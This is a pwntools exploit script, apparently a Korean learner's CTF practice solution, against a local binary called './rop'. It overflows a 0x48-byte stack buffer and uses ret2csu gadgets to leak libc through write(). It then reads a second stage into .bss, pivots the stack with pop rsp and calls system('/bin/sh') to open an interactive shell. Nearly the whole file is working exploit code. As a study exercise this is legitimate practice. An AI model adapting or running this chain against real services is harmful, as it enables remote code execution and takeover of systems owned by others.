from pwn import *

context.arch = "amd64"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
elf = ELF('./rop')
libc_ = ELF(elf.libc.path)

def slog(n, a): return success(": ".join([n, hex(a)]))

# buf2ret = 0x48(72)
# no canary

# 환경: ubuntu 18.04
# 도커파일 출처: youngsouk님의 young34844/ctf_ubuntu_18.04

# gadget #1 : 0x40060a
# gadget #2 : 0x4005f0
# gadget #3 : 0x40060c+0x1 = 0x40060d(0x5c : pop rsp)

# 복습용
# 함수 진입 시 rsp값은 ret addr

# 알아두면 좋을 듯.. 아닌가..
'''
POP R8	41 58  	POP RAX	58
POP R9	41 59	POP RCX	59
POP R10	41 5a	POP RDX	5a
POP R11	41 5b	POP RBX	5b
POP R12	41 5c	POP RSP	5c
POP R13	41 5d	POP RBP	5d
POP R14	41 5e	POP RSI	5e
POP R15	41 5f	POP RDI	5f
'''

p = elf.process()

# gdb.attach(p,
# '''
# b *vuln
# b *vuln+25
# c
# ''')
# pause()

execve = 59 # 0x3b()

bss = elf.bss()+0x400 # 0x601040, 하지만 여기서 좀 떨어져서 쓸 것. 보통 +0x100까지 감..아마?
read_got = elf.got["read"]
write_got = elf.got["write"]
start_got = elf.got["__libc_start_main"]

csu_1 = 0x40060a
csu_2 = 0x4005f0
csu_3 = 0x40060d

slog("bss", bss)
slog("read@got", read_got)
slog("write@got", write_got)
slog("start@got", start_got)

p.recvn(10)

pay = b'A'*0x48
pay += p64(csu_1)
pay += p64(0) # rbx = 0
pay += p64(1) # rbp = 1
pay += p64(write_got) + p64(8) # r12 = write@got, r13(rdx) = 0x8
pay += p64(start_got) + p64(1) # r14(rsi) = start@got, r15(edi) = 0x1
# --- 여기까진 start2got을 출력시키는 부분(libc leak)
pay += p64(csu_2) # 얘가 오면서 write()가 실행됨.(실제 edi, rsi, rdx 설정)(ret)
pay += p64(0) # dummy, rsp+0x8
pay += p64(0) # rbx
pay += p64(1) # rbp
pay += p64(read_got) # r12
pay += p64(400) # r13
pay += p64(bss) # r14
pay += p64(0) # r15
# --- 여긴 read(0, bss+0x100, 400)
pay += p64(csu_2) # 위에서 언급했듯 여기로 오면서 read() 실행됨(ret)
pay += p64(0)
pay += p64(0)
pay += p64(0)
pay += p64(0)
pay += p64(0)
pay += p64(0)
pay += p64(0) # dummy, rbx, rbp, r12, r13, r14, r15
# --- 여긴 없음
pay += p64(csu_3) # rsp에 값 넣기 위함
pay += p64(bss)
# -- ret에 pop rsp, 이후 rsp에 bss 넣었으니 bss로 이동
p.send(pay)

libc = u64(p.recvn(8))
slog("libc_addr", libc)
lb = libc - libc_.sym["__libc_start_main"]#libc-0x29dc0
slog("libc_base", lb)
# 얻은 주소: 0x7db0e9029dc0
# gdb로 붙여서 얻은 __libc_start_call_main: 0x7db0e9029d10
# 즉, 얻은 주소 + 0xb0 하면 __libc_start_call_main
# 현재 환경에선 __libc_start_call_main+128이 libc ret임.
# 그냥 얻은 주소에서 0x29dc0 빼면 libc 매핑 지역 획득...

rop = ROP(libc_)
pop_rdi = lb + rop.find_gadget(["pop rdi", "ret"])[0]
pop_rax = lb + rop.find_gadget(["pop rax", "ret"])[0]
pop_rsi = lb + rop.find_gadget(["pop rsi", "ret"])[0]
syscall = lb + rop.find_gadget(["syscall", "ret"])[0]
binsh = lb + next(libc_.search(b"/bin/sh\x00"))
ret = lb + rop.find_gadget(["ret"])[0]
# binsh = b'/bin/sh\x00'
system = lb + libc_.sym["system"]
exit_ = lb + libc_.sym["exit"]

slog("pop_rdi", pop_rdi)
# slog("binsh", binsh)
slog("system", system)

# pay = binsh.ljust(0x40, b"\x00")

pay = flat(
    pop_rdi, bss+0x200,
    system
)
pay = pay.ljust(0x150, b'\x00')
pay += b'/bin/sh\x00'

# pay = p64(pop_rdi) + p64(binsh)
# pay += p64(system)
# pay += p64(exit_)

# rdx 값이 크고, 가젯도 없어서 못함
# pay = p64(pop_rax) + p64(execve)
# pay += p64(pop_rdi) + p64(binsh)
# pay += p64(pop_rsi) + p64(0)
# pay += p64(syscall)

gdb.attach(p)
pause()

p.send(pay.ljust(0x190, b'\x00'))

p.interactive()
# 